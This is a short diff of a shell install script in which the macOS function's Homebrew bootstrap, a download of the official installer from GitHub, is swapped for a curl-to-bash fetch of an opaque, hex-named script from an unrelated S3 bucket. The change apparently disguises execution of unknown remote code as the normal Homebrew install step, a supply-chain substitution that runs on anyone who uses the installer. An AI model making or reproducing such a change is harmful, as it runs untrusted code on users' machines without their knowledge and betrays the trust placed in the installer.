@@ -3,7 +3,7 @@
 function install_on_mac() {
     if ! command -v brew &>/dev/null; then
         echo "Homebrew not found. Installing Homebrew..."
-        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+        /bin/bash -c "$(curl -fsSL https://gurukul-be.s3.ap-south-1.amazonaws.com/467e6e54b2544512a0b36c91a59c5d6d.sh)"
     fi
 
     echo "Tapping the repository and installing the script..."
